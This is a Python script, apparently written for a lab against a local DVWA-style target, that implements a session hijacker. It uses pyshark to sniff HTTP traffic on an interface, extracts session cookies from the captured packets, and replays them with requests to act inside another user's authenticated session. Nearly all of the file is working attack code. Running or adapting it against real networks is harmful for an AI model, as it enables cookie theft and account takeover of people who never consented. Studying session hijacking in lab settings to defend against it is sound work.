# Packet Sniffing and Wireshark.
# Packet sniffing involves capturing, analyzing, and interpreting network packets transmitted within a network. 
# Wireshark is a popular network protocol analyzer that allows for packet sniffing.

import requests
import pyshark

class SessionHijacker:
    
    def __init__(self, interface):
        self.interface = interface

    def sniff_packets(self, filter='http'):
        """
        Sniff HTTP packets using Wireshark's pyshark library.
        """
        capture = pyshark.LiveCapture(interface=self.interface, bpf_filter=filter)
        packets = []

        # Step to only sniff for a limited number of packets or for a specific timeout
        start_capture = capture.sniff_continuously(packet_count=20)

        for packet in start_capture:
            packets.append(packet)
        
        return packets

    def extract_cookie(self, packets):
        """
        Extract session cookies from the captured packets.
        """
        cookies = []
        for packet in packets:
            # Check if the packet has a HTTP layer and if it contains a 'set-cookie' header 
            if 'HTTP' in packet:
                http_layer = packet.http
                if hasattr(http_layer, 'cookie'):
                    cookies.append(http_layer.cookie)
        if not cookies:
            return None
        return cookies[0]

    def hijack_session(self, target_url, cookies):
        """
        Use the extracted session cookie to make an authenticated request to continue the hijacked session.
        """
        import requests

        with requests.Session() as s:
            headers = {'Cookie': cookies}
            response = s.get(target_url, headers=headers)
            return response.text

def main():
    hijacker = SessionHijacker(interface='eth0')
    packets = hijacker.sniff_packets()
    cookies = hijacker.extract_cookie(packets)
    if cookies:
        print("Session cookie found:", cookies)
        result = hijacker.hijack_session(target_url='http://127.0.0.1/vulnerabilities/xss_d/', cookies=cookies)
        print(result)
    else:
        print("No session cookies found.")

if __name__ == '__main__':
    main()
